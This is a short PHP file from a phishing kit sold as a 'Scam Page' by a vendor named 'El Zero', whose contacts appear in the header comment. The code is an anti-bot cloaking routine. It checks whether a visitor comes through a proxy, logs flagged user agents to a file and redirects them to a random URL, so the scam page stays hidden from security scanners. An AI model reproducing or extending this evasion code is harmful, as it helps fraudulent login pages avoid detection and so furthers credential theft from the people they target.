<?php 

/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
icq =>  ElZero
telegram => @Coder_seller
Site => elzeroSite.com <SOON> 
Thanks For Buying My Scam Page
Copyright all Reserved to El Zero
*/
$blockProxy = strtolower($blockProxy);
$ip = getIp();
if ($blockProxy == "true") {
	$response = checkProxy($ip);
	if ($response == "false") {
			$content = "El Zero AntiBots ".$_SERVER['HTTP_USER_AGENT']." [ Proxy ] \r\n";
		    $save=fopen("visitors/bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("Location: ".randomURl());exit();
	}
}



?>